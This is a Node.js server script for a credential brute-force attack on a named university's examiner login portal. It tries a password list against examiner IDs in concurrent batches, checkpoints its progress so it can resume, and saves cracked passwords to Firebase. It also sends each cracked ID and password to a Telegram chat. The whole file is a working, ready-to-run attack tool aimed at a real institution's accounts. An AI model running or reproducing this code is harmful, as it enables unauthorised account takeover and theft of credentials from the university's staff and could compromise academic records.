require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const axios = require('axios');
const admin = require('firebase-admin');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const { promisify } = require('util');

const writeFileAsync = promisify(fs.writeFile);
const readFileAsync = promisify(fs.readFile);

// ========== CONFIGURATION ==========
const PORT = process.env.PORT || 3000;
const LOGIN_URL = process.env.LOGIN_URL || 'https://lnmuniversity.com/Lnmu_CIA/Home/Login';
const LOGIN_TYPE = process.env.LOGIN_TYPE || 'HOD';
const PASSWORD_FILE = process.env.PASSWORD_FILE || './password.txt';
const EXAMINER_FILE = process.env.EXAMINER_FILE || './examiners.json';
const CONCURRENCY = parseInt(process.env.CONCURRENCY) || 30;          // parallel requests per batch
const REQUEST_TIMEOUT = parseInt(process.env.REQUEST_TIMEOUT) || 4000; // ms
const CHECKPOINT_INTERVAL = 500;   // save checkpoint after this many attempts
const PROGRESS_INTERVAL = 500;     // emit progress UI update

// ========== FIREBASE (optional) ==========
let db = null;
let useFirebase = false;
let bot = null;

try {
  if (process.env.FIREBASE_CREDENTIALS_BASE64) {
    const decoded = Buffer.from(process.env.FIREBASE_CREDENTIALS_BASE64, 'base64').toString('utf8');
    const serviceAccount = JSON.parse(decoded);
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
    db = admin.firestore();
    useFirebase = true;
    console.log('✅ Firebase connected (checkpoint sync to cloud)');
  } else {
    console.log('⚠️ No Firebase credentials – using local checkpoint.json');
  }
} catch (err) {
  console.log('⚠️ Firebase init failed – using local checkpoint.json');
}

if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
  console.log('✅ Telegram ready');
}

// ========== EXPRESS & SOCKET.IO ==========
const app = express();
const server = http.createServer(app);
const io = socketIo(server);
app.use(express.static('public'));

// ========== GLOBAL STATE ==========
let isRunning = false;
let isPaused = false;
let examinerIds = [];
let passwords = [];
let totalExaminers = 0;
let currentExaminerIndex = 0;
let currentPasswordIndex = 0;
let successes = new Map();     // examinerId -> password
let speedStats = { attempts: 0, startTime: null };
let lastProgressUpdate = 0;
let lastCheckpointSave = 0;

// HTTP Agent with keep-alive
const agent = new (require('http').Agent)({ keepAlive: true, maxSockets: 256 });
const axiosInstance = axios.create({
  timeout: REQUEST_TIMEOUT,
  headers: { 'User-Agent': 'Mozilla/5.0', 'Connection': 'keep-alive' },
  httpAgent: agent,
  httpsAgent: agent
});

// ========== LOAD FILES ==========
function loadExaminers() {
  const fullPath = path.resolve(EXAMINER_FILE);
  if (!fs.existsSync(fullPath)) {
    fs.writeFileSync(fullPath, JSON.stringify(['EC1032506'], null, 2));
    console.log(`📝 Created sample examiners.json at ${fullPath}`);
  }
  const data = fs.readFileSync(fullPath, 'utf8');
  examinerIds = JSON.parse(data);
  totalExaminers = examinerIds.length;
  console.log(`✅ Loaded ${totalExaminers} examiners`);
}

function loadPasswords() {
  const fullPath = path.resolve(PASSWORD_FILE);
  if (!fs.existsSync(fullPath)) {
    fs.writeFileSync(fullPath, 'admin123\npassword\n123456\n');
    console.log(`📝 Created sample password.txt at ${fullPath}`);
  }
  const content = fs.readFileSync(fullPath, 'utf8');
  passwords = content.split(/\r?\n/).filter(l => l.trim().length > 0);
  console.log(`✅ Loaded ${passwords.length} passwords (${(content.length / 1024 / 1024).toFixed(2)} MB)`);
}

// ========== CHECKPOINT (Firebase + local fallback) ==========
async function saveCheckpoint() {
  const checkpointData = {
    examinerIndex: currentExaminerIndex,
    passwordIndex: currentPasswordIndex,
    successes: Array.from(successes.entries()),
    updatedAt: new Date().toISOString(),
    status: isPaused ? 'paused' : (isRunning ? 'running' : 'stopped')
  };

  if (useFirebase) {
    try {
      await db.collection('checkpoint').doc('current').set(checkpointData, { merge: true });
      return;
    } catch (err) {
      console.error('Firebase checkpoint save failed, using local file', err.message);
    }
  }
  // Local fallback
  try {
    await writeFileAsync('./checkpoint.json', JSON.stringify(checkpointData, null, 2));
  } catch (err) {
    console.error('Local checkpoint save failed:', err.message);
  }
}

async function loadCheckpoint() {
  let checkpointData = null;

  if (useFirebase) {
    try {
      const doc = await db.collection('checkpoint').doc('current').get();
      if (doc.exists) checkpointData = doc.data();
    } catch (err) {
      console.log('Firebase checkpoint load failed, trying local file', err.message);
    }
  }
  if (!checkpointData && fs.existsSync('./checkpoint.json')) {
    try {
      const content = await readFileAsync('./checkpoint.json', 'utf8');
      checkpointData = JSON.parse(content);
    } catch (err) {
      console.error('Local checkpoint load error:', err.message);
    }
  }

  if (checkpointData) {
    currentExaminerIndex = checkpointData.examinerIndex || 0;
    currentPasswordIndex = checkpointData.passwordIndex || 0;
    if (checkpointData.successes) {
      for (const [id, pwd] of checkpointData.successes) {
        successes.set(id, pwd);
      }
    }
    console.log(`📌 Resumed: examiner ${currentExaminerIndex}, password #${currentPasswordIndex}, ${successes.size} successes already`);
  } else {
    console.log('📌 No previous checkpoint – starting fresh');
  }
}

async function loadExistingSuccesses() {
  if (!useFirebase) return;
  try {
    const snapshot = await db.collection('successful_logins').get();
    snapshot.forEach(doc => {
      const { examinerId, password } = doc.data();
      successes.set(examinerId, password);
    });
    console.log(`📦 Loaded ${successes.size} previous successes from Firebase`);
  } catch (err) {
    console.log('Could not load successes from Firebase', err.message);
  }
}

// ========== LOGIN ATTEMPT WITH ABORT CONTROLLER ==========
async function tryLogin(examinerId, password) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), REQUEST_TIMEOUT);

  try {
    const res = await axiosInstance.post(LOGIN_URL, {
      loginType: LOGIN_TYPE,
      userid: examinerId,
      password: password
    }, { signal: controller.signal });
    clearTimeout(timeoutId);
    speedStats.attempts++;
    return { success: !res.data.includes('Invalid'), password };
  } catch (err) {
    clearTimeout(timeoutId);
    speedStats.attempts++;
    // Log every 100 errors to avoid spam
    if (speedStats.attempts % 100 === 0) {
      console.error(`Request error for ${examinerId}: ${err.code || err.message}`);
    }
    return { success: false };
  }
}

// ========== PROCESS ONE EXAMINER (BATCH CONCURRENCY) ==========
async function processExaminer(examinerId, startPwdIdx) {
  let foundPassword = null;
  let pwdIdx = startPwdIdx;
  const total = passwords.length;

  while (pwdIdx < total && !foundPassword && isRunning && !isPaused) {
    const batch = passwords.slice(pwdIdx, pwdIdx + CONCURRENCY);
    const promises = batch.map(pwd => tryLogin(examinerId, pwd));
    const results = await Promise.all(promises);

    // Check if all requests in this batch failed – likely server issue, skip examiner
    const allFailed = results.every(r => !r.success);
    if (allFailed && batch.length > 0) {
      console.warn(`⚠️ All ${batch.length} requests failed for ${examinerId} at password index ${pwdIdx}. Skipping this examiner.`);
      break; // exit while, examiner will be marked as NOT found
    }

    for (let i = 0; i < results.length; i++) {
      if (results[i].success) {
        foundPassword = results[i].password;
        break;
      }
    }
    pwdIdx += batch.length;
    currentPasswordIndex = pwdIdx;

    // Progress update (throttled)
    const attemptsSinceLastProgress = speedStats.attempts - lastProgressUpdate;
    if (attemptsSinceLastProgress >= PROGRESS_INTERVAL || pwdIdx >= total) {
      const elapsed = (Date.now() - speedStats.startTime) / 1000;
      const speed = elapsed > 0 ? Math.round(speedStats.attempts / elapsed) : 0;
      io.emit('progress', {
        examinerIndex: currentExaminerIndex,
        totalExaminers,
        passwordIndex: pwdIdx,
        totalPasswords: total,
        currentExaminer: examinerId,
        speed
      });
      lastProgressUpdate = speedStats.attempts;
    }

    // Checkpoint save (non-blocking, throttled)
    const attemptsSinceLastSave = speedStats.attempts - lastCheckpointSave;
    if (attemptsSinceLastSave >= CHECKPOINT_INTERVAL || pwdIdx >= total) {
      lastCheckpointSave = speedStats.attempts;
      saveCheckpoint().catch(e => console.error('Checkpoint save error:', e.message));
    }
  }
  return { found: !!foundPassword, password: foundPassword };
}

// ========== MAIN ATTACK LOOP ==========
async function startAttack() {
  if (isRunning) {
    console.log('Attack already running');
    return;
  }
  if (passwords.length === 0) {
    io.emit('status', { running: false, paused: false, message: 'No passwords loaded' });
    return;
  }

  isRunning = true;
  isPaused = false;
  speedStats.attempts = 0;
  speedStats.startTime = Date.now();
  lastProgressUpdate = 0;
  lastCheckpointSave = 0;
  io.emit('status', { running: true, paused: false });
  console.log('🚀 Attack started');

  for (let idx = currentExaminerIndex; idx < totalExaminers && isRunning && !isPaused; idx++) {
    const examinerId = examinerIds[idx];
    if (successes.has(examinerId)) {
      console.log(`⏭️ Skipping ${examinerId} (already found)`);
      continue;
    }
    currentExaminerIndex = idx;
    const result = await processExaminer(examinerId, currentPasswordIndex);

    if (result.found) {
      successes.set(examinerId, result.password);
      io.emit('success', { examinerId, password: result.password, time: new Date().toISOString() });
      if (useFirebase) {
        await db.collection('successful_logins').add({
          examinerId,
          password: result.password,
          timestamp: admin.firestore.FieldValue.serverTimestamp()
        }).catch(e => console.error('Firestore save error:', e.message));
      }
      if (bot) {
        await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `✅ ${examinerId} : ${result.password}`)
          .catch(e => console.error('Telegram error:', e.message));
      }
      console.log(`✅ Found for ${examinerId} : ${result.password}`);
    } else {
      console.log(`❌ No password found for ${examinerId}`);
    }
    // Reset password index for next examiner
    currentPasswordIndex = 0;
    saveCheckpoint().catch(e => console.error('Checkpoint save error:', e.message));
  }

  isRunning = false;
  await saveCheckpoint();
  io.emit('status', { running: false, paused: false });
  console.log('🏁 Attack finished');
}

// ========== SOCKET.IO EVENTS ==========
io.on('connection', (socket) => {
  console.log('🖥️ Web UI connected');
  socket.emit('init', {
    totalExaminers,
    successes: Array.from(successes.entries()).map(([id, pwd]) => ({ examinerId: id, password: pwd })),
    currentExaminerIndex,
    currentPasswordIndex,
    totalPasswords: passwords.length,
    isRunning,
    isPaused
  });

  socket.on('start', () => {
    console.log('Start command received');
    startAttack();
  });
  socket.on('pause', async () => {
    if (isRunning) {
      isPaused = true;
      isRunning = false;
      await saveCheckpoint();
      io.emit('status', { running: false, paused: true });
      console.log('⏸ Paused');
    }
  });
  socket.on('resume', () => {
    console.log('Resume command received');
    startAttack();
  });
  socket.on('stop', async () => {
    isRunning = false;
    isPaused = false;
    currentExaminerIndex = 0;
    currentPasswordIndex = 0;
    successes.clear();
    await saveCheckpoint();
    io.emit('init', {
      totalExaminers,
      successes: [],
      currentExaminerIndex: 0,
      currentPasswordIndex: 0,
      totalPasswords: passwords.length,
      isRunning: false,
      isPaused: false
    });
    console.log('⏹ Stopped and reset');
  });
});

// ========== START SERVER ==========
(async () => {
  loadExaminers();
  loadPasswords();
  await loadExistingSuccesses();
  await loadCheckpoint();
  server.listen(PORT, () => {
    console.log(`✅ Server running at http://localhost:${PORT}`);
    console.log(`⚡ Concurrency: ${CONCURRENCY} requests/batch`);
    console.log(`📊 Total examiners: ${totalExaminers}`);
    console.log(`🔑 Total passwords: ${passwords.length}`);
    console.log(`💾 Initial memory: ${(process.memoryUsage().rss / 1024 / 1024).toFixed(2)} MB`);
  });
})();
